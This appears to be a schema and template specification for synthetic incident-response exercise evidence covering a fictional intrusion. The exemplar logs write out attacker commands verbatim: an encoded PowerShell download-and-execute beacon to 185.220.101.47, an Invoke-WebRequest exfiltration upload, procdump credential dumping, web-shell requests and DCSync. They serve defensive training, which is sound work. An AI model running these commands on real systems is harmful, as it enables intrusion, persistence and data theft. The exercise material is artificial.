# EVIDENCE_SCHEMAS_TEMPLATES.md

**Vistara Polymers Incident — Evidence Schemas & Exemplar Templates**
**Version:** 1.1 — Agent 3.5 consistency pass (2026-09-11)
**Companion:** EVIDENCE_DIRECTORY_SPEC.md v1.1. Sources: ATTACK_TIMELINE.md v1.1, ENVIRONMENT.md v1.1, SCENARIO_BIBLE.md v1.1.

> **ALL DATA ON THIS PAGE AND IN ALL ARTIFACTS IS SYNTHETIC / FICTIONAL TRAINING DATA.**
> **Timezone convention (stated once, per ENVIRONMENT.md §12):** every template timestamp is **IST (UTC+05:30)** EXCEPT IIS access logs, which are **UTC** and carry the canonical in-header conversion note, verbatim: `# Synthetic training data. IIS timestamps are UTC. Convert to IST by adding +05:30.`
> Canonical values used: hosts WEB-PRD-01 (203.0.113.10 / 10.10.20.11), APP-PRD-01 (10.10.20.21), FILE-PRD-01 (10.10.20.23), DC-01 (10.10.20.31), DC-02 (10.10.20.32), DB-PRD-01 (10.10.30.21), ERP-APP-01 (10.10.20.22), VULN-01 (10.10.40.13), VPN-GW-01 (10.10.20.13 / 203.0.113.12); attacker IPs 45.155.90.23 (VPN exit) and 185.220.101.47:8443 (C2/exfil VPS); accounts svc_portal, rajesh.kulkarni, svc_mon; web shell `C:\inetpub\wwwroot\staging\assets\upload_2024\img.aspx`; benign Ahmedabad source 122.176.45.9 (RH-02/RH-03).

Each section gives **(a) compact JSON schema** (types; `*` = required) and **(b) one raw-looking exemplar template (3–10 lines)**.

> **Rendering rule (applies to every section; see §15):** exemplar bodies below are candidate-visible content. Classification fields (`red_herring`, `rh_refs`, `rule_out`, `corroborates`, `evt_refs`, `relevance`, `expected_significance`) are NOT part of any artifact body — they live only in `internal_metadata` per EVIDENCE_DIRECTORY_SPEC v1.1 §4–5 and are never rendered to candidates.

---

## 1. IIS Access Log (web/) — E-WEB-001…004

**(a) Schema** (per parsed record; raw artifact is W3C text):

```json
{
  "evidence_id*": "string (E-WEB-###)",
  "type*": "iis_access_log",
  "host*": "WEB-PRD-01",
  "record": {
    "date_utc*": "YYYY-MM-DD", "time_utc*": "HH:MM:SS",
    "s_ip*": "string (10.10.20.11)", "cs_method*": "GET|POST",
    "cs_uri_stem*": "string", "cs_uri_query": "string|null",
    "c_ip*": "string (client IP)", "cs_user_agent*": "string",
    "sc_status*": "integer", "sc_bytes": "integer", "time_taken_ms": "integer"
  }
}
```

**(b) Exemplar — E-WEB-002 / E-WEB-003** (recon burst + upload + shell callbacks; UTC with the canonical conversion header line; EVT-003, EVT-008):

```
# Synthetic training data. IIS timestamps are UTC. Convert to IST by adding +05:30.
# Source: WEB-PRD-01 IIS W3SVC1 W3C log excerpt.
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query c-ip cs(User-Agent) sc-status sc-bytes time-taken
2026-09-02 09:35:12 10.10.20.11 GET /staging/admin - 45.155.90.23 Mozilla/5.0+(compatible;+Go-http-client/1.1) 404 1245 12
2026-09-02 09:35:14 10.10.20.11 GET /staging/test - 45.155.90.23 Mozilla/5.0+(compatible;+Go-http-client/1.1) 200 2311 18
2026-09-02 09:35:15 10.10.20.11 GET /staging/test/upload.aspx - 45.155.90.23 Mozilla/5.0+(compatible;+Go-http-client/1.1) 200 1890 22
2026-09-03 07:32:41 10.10.20.11 POST /staging/test/upload.aspx - 45.155.90.23 Mozilla/5.0 200 412 156
2026-09-03 07:34:02 10.10.20.11 GET /staging/assets/upload_2024/img.aspx cmd=whoami 45.155.90.23 Mozilla/5.0 200 980 145
2026-09-03 07:36:55 10.10.20.11 GET /staging/assets/upload_2024/img.aspx cmd=ipconfig+/all 45.155.90.23 Mozilla/5.0 200 2210 98
```

Note: `2026-09-03 07:32:41 UTC` = `13:02:41 IST` (EVT-008 shell upload). Benign interleave for E-WEB-004 uses `pranav.joshi` order POSTs at 2026-09-06 11:15–12:05 UTC (16:45–17:35 IST, RH-02).

---

## 2. Windows Security Events (auth/) — E-AUTH-*, E-AD-*

**(a) Schema:**

```json
{
  "evidence_id*": "string", "type*": "windows_security",
  "host*": "string (log-hosting server)",
  "record": {
    "event_id*": "integer (4624|4625|4662|4720|4725|4726|4728|4732|4776)",
    "time_ist*": "ISO8601 +05:30",
    "account_name*": "string", "account_domain*": "VISTARA",
    "logon_type": "integer|null (3=network, 10=remote interactive)",
    "source_ip*": "string", "workstation": "string|null",
    "status": "hex|null", "sub_status": "hex|null",
    "target_account": "string|null", "target_group": "string|null",
    "access_mask": "hex|null", "properties": "string|null"
  }
}
```

**(b) Exemplar — E-AUTH-001** (4625 brute force → 4624 Type 10 success, corroborated by DC-01 4776 NTLM validation, EVT-004/005; LogonType 10, source 45.155.90.23):

```
# SYNTHETIC TRAINING DATA — WEB-PRD-01 Security log excerpt (SIEM export). Timezone: IST.
# 147 failed logons 10:22–11:46 from 45.155.90.23 (12 representative lines; see DRILL-DOWN E-AUTH-001_drilldown.csv)
Event 4625  2026-09-03 10:22:14 IST  Logon Type 10  Account: administrator  Domain: VISTARA  Source: 45.155.90.23  Status: 0xC000006A  SubStatus: 0xC0000064 (user does not exist)
Event 4625  2026-09-03 10:41:55 IST  Logon Type 10  Account: svc_portal     Domain: VISTARA  Source: 45.155.90.23  Status: 0xC000006A  SubStatus: 0xC000006A (bad password — account exists)
Event 4625  2026-09-03 11:46:31 IST  Logon Type 10  Account: svc_portal     Domain: VISTARA  Source: 45.155.90.23  Status: 0xC000006A  SubStatus: 0xC000006A
Event 4776  2026-09-03 11:47:01 IST  Host: DC-01  Account: svc_portal  Source: WEB-PRD-01 (10.10.20.11)  NTLM credential validation SUCCESS (package: NTLMv2)
Event 4624  2026-09-03 11:47:03 IST  Logon Type 10  Account: svc_portal  Domain: VISTARA  Source: 45.155.90.23  Workstation: -  Status: 0x0 (SUCCESS — RDP session opened)
```

**(c) Exemplar — E-AUTH-004 / E-AUTH-007 / E-AUTH-003** (lateral movement, Type 10 RDP):

```
Event 4624  2026-09-04 09:58:11 IST  Logon Type 10  Account: rajesh.kulkarni  Domain: VISTARA  Source: 10.10.20.11 (WEB-PRD-01)  Host: APP-PRD-01  SUCCESS
Event 4625  2026-09-03 15:12:44 IST  Logon Type 3   Account: rajesh.kulkarni  Domain: VISTARA  Source: 10.10.20.11  Host: APP-PRD-01  Status: 0xC000006A (bad password — RajKulk@2023 attempt FAILED)
Event 4624  2026-09-05 10:15:39 IST  Logon Type 10  Account: svc_mon  Domain: VISTARA  Source: 10.10.20.21 (APP-PRD-01)  Host: FILE-PRD-01  SUCCESS
```

**(d) Exemplar — E-AUTH-006 / E-AD-001 / E-AD-002 / E-AD-004** (DCSync 4662; svc_mon lifecycle 4720/4728/4732/4725/4726):

```
Event 4662  2026-09-04 13:10:22 IST  Host: DC-01  Account: rajesh.kulkarni  Source: 10.10.20.21 (APP-PRD-01)  AccessMask: 0x100  Properties: {1131f6aa-…}{1131f6ad-…} (DS-Replication-Get-Changes-All) — directory replication requested
Event 4720  2026-09-04 11:15:47 IST  Host: DC-01  Subject: rajesh.kulkarni (from APP-PRD-01)  New account: svc_mon  Display: "Monitoring Agent"  "A user account was created"
Event 4728  2026-09-04 11:16:05 IST  Host: DC-01  Member added: svc_mon  Group: Domain Admins  By: rajesh.kulkarni
Event 4732  2026-09-04 11:16:31 IST  Member added: svc_mon  Group: Remote Desktop Users (local, APP-PRD-01 & WEB-PRD-01)  By: rajesh.kulkarni
Event 4725  2026-09-09 10:31:12 IST  Host: DC-01  Account disabled: svc_mon  By: rajesh.kulkarni-temp (IR)        # containment, EVT-033
Event 4726  2026-09-09 12:22:40 IST  Host: DC-01  Account deleted: svc_mon  By: IR responder                        # eradication, EVT-035 step 4
```

---

## 3. Sysmon-style / EDR Process Telemetry (edr/) — E-EDR-001…015

**(a) Schema:**

```json
{
  "evidence_id*": "string (E-EDR-###)",
  "type*": "edr_process",
  "source*": "SentinelNode EDR (EDR-CON-01)",
  "host*": "string",
  "events*": [{
    "time_ist*": "ISO8601 +05:30",
    "pid*": "integer", "process*": "string (image name)",
    "cmdline*": "string (VERBATIM attacker command)",
    "parent*": "string (image name)", "parent_pid": "integer",
    "user*": "string (e.g. VISTARA\\svc_portal)",
    "sha256*": "string (64-hex, SYNTHETIC)",
    "synthetic*": true
  }]
}
```

**(b) Exemplar — E-EDR-008** (scheduled-task beacon creation, EVT-018):

```json
{"evidence_id":"E-EDR-008","type":"edr_process","source":"SentinelNode EDR","host":"APP-PRD-01","events":[
 {"time_ist":"2026-09-04T11:30:14+05:30","pid":4812,"process":"cmd.exe","cmdline":"schtasks /create /tn \"MicrosoftEdgeUpdateTaskMachineCore\" /sc minute /mo 30 /ru SYSTEM /tr \"powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA0ADcAOgA4ADQANAAzAC8AYgBlAGEAYwBvAG4AJwApAA==\"","parent":"explorer.exe","parent_pid":3304,"user":"VISTARA\\rajesh.kulkarni","sha256":"SYNTHETIC-4f8c…c1","synthetic":true},
 {"time_ist":"2026-09-04T11:32:00+05:30","pid":5090,"process":"powershell.exe","cmdline":"powershell -enc SQBFAFgA…AA==","parent":"svchost.exe","parent_pid":664,"user":"NT AUTHORITY\\SYSTEM","sha256":"SYNTHETIC-91ab…7e","synthetic":true}]}
```

**(c) Exemplar — E-EDR-004** (w3wp dump, EVT-012) and **E-EDR-012** (exfil, EVT-024) — compact lines:

```json
{"time_ist":"2026-09-03T15:05:33+05:30","process":"procdump.exe","cmdline":"procdump -ma 2844 C:\\ProgramData\\Microsoft\\Crypto\\RSA\\w3wp.dmp","parent":"cmd.exe","user":"VISTARA\\svc_portal","host":"WEB-PRD-01","sha256":"SYNTHETIC-b221…aa","synthetic":true}
{"time_ist":"2026-09-05T12:30:41+05:30","process":"powershell.exe","cmdline":"powershell Invoke-WebRequest -Uri https://185.220.101.47:8443/upload -Method Post -InFile C:\\Windows\\Temp\\order_export_2026.zip","parent":"cmd.exe","user":"VISTARA\\svc_mon","host":"FILE-PRD-01","sha256":"SYNTHETIC-7702…3d","synthetic":true}
```

**(d) Exemplar — E-EDR-015** (session telemetry, type `edr_session`; registered v1.1 as `edr/E-EDR-015_file-prd-01_svc_mon_session.json`; EVT-021 + continuity for EVT-022/023/024):

```json
{"evidence_id":"E-EDR-015","type":"edr_session","source":"SentinelNode EDR","host":"FILE-PRD-01",
 "session":{"user":"VISTARA\\svc_mon","logon_type":10,"src_ip":"10.10.20.21 (APP-PRD-01)",
 "start_ist":"2026-09-05T10:15:39+05:30","end_ist":"2026-09-05T13:05:12+05:30",
 "note":"single continuous RDP session spanning share collection, archive staging, and exfil"},
 "synthetic":true}
```

All EVT command lines (whoami, ipconfig /all, net user, quser, netstat -ano, tasklist, wmic process get, appcmd list apppool /config, type/findstr passwords, net group "Domain Admins" /domain, nltest /dclist:vistara.local, robocopy S:\Clients C:\Windows\Temp\collect, Compress-Archive ×2, lsadump::dcsync, Clear-History) MUST appear verbatim in E-EDR-001…014 exactly as listed in ATTACK_TIMELINE.md.

---

## 4. PowerShell Log Entry (edr/ or auth/) — E-EDR-008B (encoded beacon)

**Registration (v1.1):** E-EDR-008B is a first-class registered artifact, `edr/E-EDR-008B_app-prd-01_beacon_scriptblock.log` (type `powershell_log`, reveal phase 1, maps EVT-018). It is a second source for the beacon payload alongside E-EDR-008 / E-FS-004 / E-NET-003.

**(a) Schema:** `{"evidence_id*":"E-EDR-008B","type*":"powershell_log","host*":"APP-PRD-01","record":{"time_ist*":"ISO8601","event_id*":4104,"script_block*":"string","user*":"string","synthetic*":true}}`

**(b) Exemplar** (Microsoft-Windows-PowerShell/Operational, Event 4104):

```
# SYNTHETIC — APP-PRD-01 PowerShell Operational log excerpt. Timezone: IST.
Event 4104  2026-09-04 11:32:00 IST  User: NT AUTHORITY\SYSTEM  ScriptBlock text:
  powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA0ADcAOgA4ADQANAAzAC8AYgBlAGEAYwBvAG4AJwApAA==
# Decodes to (shown in drill-down): IEX (New-Object Net.WebClient).DownloadString('https://185.220.101.47:8443/beacon')
```

---

## 5. FW-01 Perimeter Log + NetFlow Summary (net/) — E-NET-001…006, E-PROXY-001

**(a) Schema:**

```json
{
  "evidence_id*": "string (E-NET-###)", "type*": "firewall_log|netflow_summary|proxy_log",
  "source*": "FW-01 (perimeter iptables/syslog; NetFlow v9) | egress proxy",
  "record": {
    "time_ist*": "ISO8601 +05:30", "action*": "ALLOW|DENY",
    "proto*": "TCP|UDP", "src_ip*": "string", "src_port": "integer",
    "dst_ip*": "string", "dst_port*": "integer",
    "bytes": "integer|null", "rule": "string|null",
    "note": "string|null (e.g. retention note)"
  }
}
```

**(b) Exemplar — E-NET-001 / E-NET-002 / E-NET-004** (scan, RDP allow, exfil flows; EVT-001/002/005/010/024):

```
# SYNTHETIC — FW-01 syslog excerpt. Timezone: IST. NetFlow retained 7 days only (W-09); today 2026-09-09 → flows before 2026-09-02 unavailable in NetFlow (see E-NET-006).
Sep  2 14:12:03 FW-01 kernel: INBOUND DENY  proto=TCP src=45.155.90.23:51122 dst=203.0.113.10:22     [scan 1/10000 — 9,846 probes, summary + drilldown CSV]
Sep  2 14:12:31 FW-01 kernel: INBOUND ALLOW proto=TCP src=45.155.90.23:51490 dst=203.0.113.10:3389   rule=LEGACY-VENDOR-2025-RDP (NO CHANGE TICKET — CH-Policy-03)
Sep  3 11:47:01 FW-01 kernel: INBOUND ALLOW proto=TCP src=45.155.90.23:60177 dst=203.0.113.10:3389   rule=LEGACY-VENDOR-2025-RDP  bytes=1823104
Sep  3 13:25:10 FW-01 kernel: OUTBOUND ALLOW proto=TCP src=10.10.20.11:49812 dst=185.220.101.47:8443 bytes=18874368 (~18 MB, staging.zip exfil — NetFlow EXPIRED, FW log only)
Sep  5 12:30:44 FW-01 kernel: OUTBOUND ALLOW proto=TCP src=10.10.20.23:52240 dst=185.220.101.47:8443 bytes=713031680 (~680 MB, order_export_2026.zip exfil, 12:30–13:05, chunked)
```

E-NET-003 drill-down CSV: one row per 30-min beacon `10.10.20.21 → 185.220.101.47:8443, ~4 KB`, 2026-09-04 11:32 → 2026-09-09 10:30 (blocked at containment).

E-NET-005 = FW-01 connection/session log: TCP 3389 session 45.155.90.23 → 203.0.113.10, 2026-09-03 11:47–12:20 IST (EVT-005/006). E-NET-006 = `net/E-NET-006_netflow_summary_7day_retention.log` (type `netflow_summary`): the NetFlow 7-day-retention summary — as of 2026-09-09 the 09-03 exfil flow is absent from NetFlow and visible only in FW-01 logs + EDR (W-09 teaching point, EVT-010/024 context).

**(c) Exemplar — E-PROXY-001** (type `proxy_log`; registered v1.1 as `net/E-PROXY-001_egress_proxy_absence.log`; explicit negative record, NOT an empty file; EVT-010):

```
# SYNTHETIC — Egress proxy log query result. Timezone: IST. Query window 2026-09-03 13:25–13:31.
Query: src=10.10.20.11 dst=185.220.101.47:8443  →  0 matching entries (no matching entries in proxy logs)
Query: src=10.10.20.0/24 (server VLAN) any egress  →  0 matching entries for window
# NOTE: server-VLAN egress is direct (no proxy enforcement); absence here is expected and consistent with FW-01 log E-NET-002.
```

---

## 6. AD Object Snapshot (ad/) — E-AD-003

**(a) Schema:**

```json
{
  "evidence_id*": "E-AD-003", "type*": "ad_snapshot",
  "source*": "DC-01 directory export (Get-ADGroupMember / Get-ADUser)",
  "captured_ist*": "ISO8601",
  "domain*": "vistara.local",
  "groups*": [{"name*": "Domain Admins", "members*": ["string"]}],
  "objects*": [{"sam*": "string", "display*": "string", "description": "string",
                "created_ist*": "ISO8601", "enabled*": true, "member_of*": ["string"], "last_logon_ist": "ISO8601|null"}]
}
```

**(b) Exemplar** (svc_mon in Domain Admins — persistence #1 made visible; note `last_logon_ist` per object, incl. admin_legacy ≈2025-07, 14 months dormant — the RH-04 rule-out surface):

```json
{"evidence_id":"E-AD-003","type":"ad_snapshot","source":"DC-01","captured_ist":"2026-09-09T10:05:00+05:30","domain":"vistara.local",
 "groups":[{"name":"Domain Admins","members":["svc_backup","admin_legacy","rajesh.kulkarni","svc_mon"]}],
 "objects":[{"sam":"svc_mon","display":"Monitoring Agent","description":"Systems monitoring service","created_ist":"2026-09-04T11:15:47+05:30","enabled":true,"member_of":["Domain Admins","Remote Desktop Users"],"last_logon_ist":"2026-09-05T10:15:39+05:30"},
 {"sam":"admin_legacy","display":"Legacy Admin","description":"Legacy administrator account","created_ist":"2019-04-02T09:00:00+05:30","enabled":true,"member_of":["Domain Admins"],"last_logon_ist":"2025-07-14T11:02:00+05:30"}]}
```

---

## 7. SQL Server Audit Excerpt (db/) — E-DB-001

**(a) Schema:** `{"evidence_id*":"E-DB-001","type*":"sql_audit","host*":"DB-PRD-01","record":{"time_ist*":"ISO8601","session_user*":"string","client_ip*":"string","action*":"LOGIN|SELECT","statement*":"string","rows_returned":"integer|null"}}`

**(b) Exemplar** (read-only enumeration, EVT-025; no bulk export — scoping teaching point):

```
# SYNTHETIC — DB-PRD-01 SQL Server audit excerpt (instance VISTARA_SQL). Timezone: IST.
2026-09-05 15:20:11 IST  LOGIN  user=VISTARA\rajesh.kulkarni  client=10.10.20.23 (FILE-PRD-01)  SUCCESS (Windows auth)
2026-09-05 15:21:02 IST  SELECT statement="SELECT name FROM sys.databases;"  rows=3 (PortalDB, ERPDB, HRDB)
2026-09-05 15:34:47 IST  SELECT statement="SELECT TOP 5 * FROM PortalDB.dbo.Customers"  rows=5
2026-09-05 15:41:19 IST  SELECT statement="SELECT TOP 5 * FROM ERPDB.dbo.Vendors"  rows=5
# NOTE: no BULK/EXPORT/bcp statements; session closed 15:41. READ-ONLY enumeration only.
```

---

## 8. VPN-GW-01 Log (auth/) — E-AUTH-010 / E-AUTH-011 (RH-02, RH-03) + E-AUTH-012

**(a) Schema:** `{"evidence_id*":"E-AUTH-01#","type*":"vpn_log","host*":"VPN-GW-01","record":{"time_ist*":"ISO8601","user*":"string","src_ip*":"string","assigned_ip":"string","duration_min":"integer","action*":"CONNECT|DISCONNECT","note":"string"}}`

(Classification fields for these artifacts — RH-02/RH-03 mapping and rule-out rationale — live only in `internal_metadata` per §15; they are not schema fields of the candidate-visible record.)

**(b) Exemplar** (benign Ahmedabad logins; diegetic in-world notes only):

```
# SYNTHETIC — VPN-GW-01 SSL-VPN auth log. Timezone: IST.
2026-09-06 16:45:02 IST  CONNECT  user=pranav.joshi  src=122.176.45.9 (Vistara Ahmedabad office, registered static IP — see asset inventory)  assigned=10.10.10.153  session OK
2026-09-06 17:35:40 IST  DISCONNECT user=pranav.joshi  duration=50m  note="orders placed match dealer POs #DLR-2291/#DLR-2294 (see E-WEB-004)"
2026-09-07 11:20:18 IST  CONNECT  user=ananya.iyer  src=122.176.45.9 (Ahmedabad office)  assigned=10.10.10.141  note="HR travel approval TRV-2026-0312 on file (E-DOC-003); ERP access role-consistent (E-AUTH-011 4624 11:26)"
```

Red-herring classification, `rh_refs`, and `rule_out` for E-AUTH-010 / E-AUTH-011 live ONLY in `internal_metadata` per EVIDENCE_DIRECTORY_SPEC v1.1 §4–5 and are never rendered to candidates.

**E-AUTH-012** (registered v1.1): `auth/E-AUTH-012_vpn-gw-01_full_window_summary.log` — full-window VPN session summary 2026-09-02 → 2026-09-09: only pranav.joshi 09-06 and ananya.iyer 09-07 outside baseline; no logins from 45.155.90.23 / 185.220.101.47; no svc_* VPN logins. Negative evidence closing the "initial access via VPN?" question; same `vpn_log` schema as above.

---

## 9. Vuln Scanner Job Log (vuln/) — E-VULN-001/002 (RH-01)

**(a) Schema:** `{"evidence_id*":"E-VULN-00#","type*":"vuln_scan_job","host*":"VULN-01","record":{"job_id*":"string","job_type*":"scheduled|on_demand","schedule_note":"string|null","start_ist*":"ISO8601","end_ist*":"ISO8601","scanner_ip*":"10.10.40.13","auth":"authenticated","targets*":integer,"operator":"devang.shah"}}`

(The v1.0 `schedule` field is replaced by `job_type*` + `schedule_note`. Rule-out rationale for RH-01 lives only in `internal_metadata` per §15.)

**(b) Exemplar:**

```
# SYNTHETIC — VULN-01 (10.10.40.13) scan job log.
JOB VS-MAN-2026-0904  start=2026-09-04 09:15:00 IST  end=11:02:41 IST  mode=AUTHENTICATED (cred svc_monitor)  trigger=ON-DEMAND  operator=devang.shah  targets=14 (Server VLAN sweep)
  10.10.20.11 WEB-PRD-01  23 plugins fired, 0 critical   10.10.20.21 APP-PRD-01  19 plugins fired, 1 medium
  10.10.20.23 FILE-PRD-01 17 plugins fired, 0 critical   next scheduled run 2026-09-08 02:00 IST (job VS-WK37-2026)
```

E-VULN-002 (recurring weekly instance, EVT-028): `2026-09-08 02:00–03:47 IST`, job VS-WK37-2026, weekly Tuesday 02:00 IST schedule, same scanner/profile; registered file `vuln/E-VULN-002_vuln01_scan_job_2026-09-08.log`.

---

## 10. SMB File-Access Audit (fs/) — E-SHARE-001

**Registration (v1.1):** E-SHARE-001 is registered under path `fs/` per EVIDENCE_DIRECTORY_SPEC v1.1 (directory assignment is `fs/`, not `auth/`).

**(a) Schema:** `{"evidence_id*":"E-SHARE-001","type*":"smb_file_audit","host*":"FILE-PRD-01","record":{"time_ist*":"ISO8601","user*":"string","src_ip*":"string","share*":"string","path*":"string","access*":"READ|WRITE|DELETE","bytes":"integer|null"}}`

**(b) Exemplar** (collection on FILE-PRD-01, EVT-022; summarized + drill-down):

```
# SYNTHETIC — FILE-PRD-01 SMB object-access audit excerpt. Timezone: IST. # SUMMARY: 1,214 file opens 10:20–11:45 by VISTARA\svc_mon from 10.10.20.21; 30 representative lines (drill-down: E-SHARE-001_drilldown.csv).
2026-09-05 10:21:08 IST  READ  user=VISTARA\svc_mon  src=10.10.20.21  share=S:\  path=S:\Clients\FMCG-07\design_rev3.dwg
2026-09-05 10:47:52 IST  READ  user=VISTARA\svc_mon  src=10.10.20.21  share=S:\  path=S:\Specs\foodgrade_film_spec.pdf
2026-09-05 11:02:19 IST  READ  user=VISTARA\svc_mon  src=10.10.20.21  share=R:\  path=R:\HR\payroll_aug2026.xlsx
2026-09-05 11:15:44 IST  READ  user=VISTARA\svc_mon  src=10.10.20.21  share=R:\  path=R:\Finance\finance_summary_q2.xlsx
```

---

## 11. Documents (docs/) — E-WIKI-001, E-DOC-001, E-DOC-002, E-DOC-003

**(a) Schema:** `{"evidence_id*":"string","type*":"document","format*":"markdown","author":"string","date":"YYYY-MM-DD","synthetic*":true}`

(`rh_refs` — e.g. the RH-05 mapping for E-DOC-002 — is an `internal_metadata` field per §15, not part of the candidate-visible document record.)

**(b) Exemplar — E-WIKI-001** (service-account wiki page, W-03):

```
# SYNTHETIC — IT Wiki: "Service Accounts — Registered Credentials" (AC-Policy-02 register) | Last edited 2024-03-14 by rajesh.kulkarni
| Account    | Purpose                        | Password     | Rotation                |
| svc_portal | Dealer portal app pool (WEB+APP) | Portal@2024  | EXEMPT — AC-Policy-02 §4  |
| svc_backup | Veeam service                  | (vaulted)    | vaulted, auto-rotated    |
NOTE: svc_portal is local admin on WEB-PRD-01 for legacy app-pool reasons — do not remove.
```

**(c) Exemplar — E-DOC-001** (2025 vendor email, W-01 origin, VP-Policy-05 violation):

```
# SYNTHETIC — Email, From: vendor.support@polypack-solutions.example  To: it-manager@vistara-polymers.in  Date: 2025-06-17 14:22 IST
Subject: RE: Portal upload page troubleshooting — done
"Thanks for opening RDP directly to the web server — much faster than the VPN. Please leave the firewall rule in place
in case we need to get back in this week." — Verbal OK given by then-IT-manager (departed Dec 2025). No change ticket filed.
```

**(d) Exemplar — E-DOC-002** (prior IR note; RH-05 context in internal_metadata only):

```
# SYNTHETIC — IR-2025-011 closure note, 2025-11-08: QUARANTINED file C:\inetpub\wwwroot\assets\old\upload_bak.aspx on WEB-PRD-01
(old vendor shell upload attempt; blocked before execution). File retained for reference. CLOSED. No relation to any 2026 activity.
```

**(e) Exemplar — E-DOC-003** (registered v1.1 as `docs/E-DOC-003_hr_travel_approval_TRV-2026-0312.md`; type `document`, reveal phase 1; diegetic dossier content only — no attack facts, no authoring labels):

```
# SYNTHETIC — Vistara Polymers HR — Travel Approval Record
Ticket: TRV-2026-0312   Employee: Ananya Iyer (ananya.iyer), Sales — Key Accounts   Status: APPROVED 2026-09-04
Travel window: 2026-09-07 → 2026-09-09   Purpose: client visit, Ahmedabad (dealer quarterly review)
Approving manager: Rohit Chavan   Notes: remote ERP access expected during travel per Sales role profile.
```

---

## 12. SIEM Alert + Correlation View (alerts/) — E-ALERT-001/002; ServiceNow E-TICKET-001

**(a) Schema:**

```json
{
  "evidence_id*": "E-ALERT-001", "type*": "siem_alert",
  "source*": "Wazuh SIEM (SIEM-01)", "alert_id*": "EDR-20260909-0417",
  "time_ist*": "ISO8601", "severity*": "critical",
  "host*": "APP-PRD-01", "rule*": "string",
  "summary*": "string", "iocs*": ["string"],
  "correlated_evidence*": ["E-EDR-008","E-NET-003","E-AUTH-006","E-AUTH-007","E-NET-002","E-NET-004"],
  "synthetic*": true
}
```

**(b) Exemplar:**

```json
{"evidence_id":"E-ALERT-001","type":"siem_alert","source":"Wazuh SIEM (SIEM-01)","alert_id":"EDR-20260909-0417","time_ist":"2026-09-09T09:47:12+05:30","severity":"critical","host":"APP-PRD-01","rule":"Suspicious PowerShell encode + external connection","summary":"Encoded PowerShell (child of scheduled task 'MicrosoftEdgeUpdateTaskMachineCore') made outbound TCP 8443 connection to 185.220.101.47","iocs":["185.220.101.47","powershell -enc","MicrosoftEdgeUpdateTaskMachineCore"],"correlated_evidence":["E-EDR-008","E-NET-003"],"synthetic":true}
```

E-ALERT-002 (correlation view, EVT-032) extends the schema with `"cluster":[{"evt":"Type 10 logon svc_mon FILE-PRD-01 09-05 10:15","ref":"E-AUTH-007"},{"evt":"4662 replication DC-01 from APP-PRD-01 09-04 13:10","ref":"E-AUTH-006"},{"evt":"Outbound 8443 WEB-PRD-01 09-03 / FILE-PRD-01 09-05","ref":"E-NET-002/E-NET-004"}]`. E-TICKET-001: `{"type":"ticket","id":"INC-2026-0417","opened_ist":"2026-09-09T09:52:00+05:30","opened_by":"Priya Nair (SOC L2)","severity":"Sev-1 per IR-Policy-01","assignment":"Senior IR Analyst (candidate)","status":"Investigating"}`.

---

## 13. Response & Validation Records (response/) — E-RESP-001…004, E-VALID-001/002

**(a) Schema:**

```json
{
  "evidence_id*": "E-RESP-001", "type*": "response_record|validation_record",
  "incident*": "INC-2026-0417", "phase*": "containment|preservation|eradication|recovery|validation",
  "time_ist*": "ISO8601", "actor*": "string (IR team / candidate)",
  "actions*": [{"order*": "integer", "action*": "string", "target*": "string",
                "result*": "SUCCESS|FAILED|PENDING", "detail": "string"}],
  "checks": [{"check": "string", "result": "PASS|FAIL|SKIPPED", "basis": "string"}],
  "synthetic*": true
}
```

**(b) Exemplar — E-RESP-001** (containment, EVT-033):

```json
{"evidence_id":"E-RESP-001","type":"response_record","incident":"INC-2026-0417","phase":"containment","time_ist":"2026-09-09T10:30:00+05:30","actor":"IR team",
 "actions":[{"order":1,"action":"EDR network isolation","target":"APP-PRD-01, FILE-PRD-01, WEB-PRD-01","result":"SUCCESS","detail":"8443 C2 from APP-PRD-01 ceased 10:30"},
 {"order":2,"action":"Disable accounts","target":"svc_mon, rajesh.kulkarni, svc_portal","result":"SUCCESS","detail":"4725 events E-AD-004"},
 {"order":3,"action":"FW-01 egress block","target":"185.220.101.47 (all ports)","result":"SUCCESS"},
 {"order":4,"action":"Suspend /staging/ site","target":"WEB-PRD-01","result":"SUCCESS"}],"synthetic":true}
```

**(c) Exemplar — E-VALID-002** (safe-state gate, EVT-037 — includes the §30 trap):

```
# SYNTHETIC — Safe-state validation report, INC-2026-0417, 2026-09-09 17:30 IST
[PASS]     EDR full-scan clean: WEB-PRD-01, APP-PRD-01, FILE-PRD-01 (post rebuild/restore)
[SKIPPED→] Persistence re-check on APP-PRD-01 initially SKIPPED ("host was rebuilt") — RE-RUN 16:55: scheduled tasks/services/run keys/web dirs CLEAN; AD audit: svc_mon ABSENT  → PASS (required before declaration)
[PASS]     Credential resets verified: rajesh.kulkarni, svc_portal, all Domain Admins, krbtgt ×2, org-wide user reset
[PASS]     Network: no egress to 185.220.101.47 in 72h; FW-01 RDP rule removed; external scan shows 3389 CLOSED on 203.0.113.10; /staging/test/upload.aspx returns 404
[PASS]     Logs: no new 4624 Type 10 from unexpected sources; no encoded-PowerShell beacons
[PASS]     Business: dealer portal order flow tested; shares S:/R: accessible; payroll app verified untouched
DECLARATION: SAFE STATE at 17:30 IST — permitted only because checklist is COMPLETE (EDR-clean alone was insufficient).
```

E-RESP-003 (eradication) actions array mirrors the canonical ordered set (task removal → web shell deletion → staged-artifact deletion → svc_mon deletion → credential resets incl. krbtgt ×2 → FW-01 rule removal → upload-page closure → verification). E-RESP-004 (recovery) mirrors the canonical sequence DC-01/DC-02 validate → WEB-PRD-01 rebuild → APP-PRD-01 rebuild → FILE-PRD-01 restore-from-2026-09-02-backup → 72h enhanced monitoring.

---

## 14. Coverage & Consistency Checklist (generator contract)

- Every attacker command in ATTACK_TIMELINE.md appears verbatim in ≥1 template above or its E-EDR sibling (§3 contract).
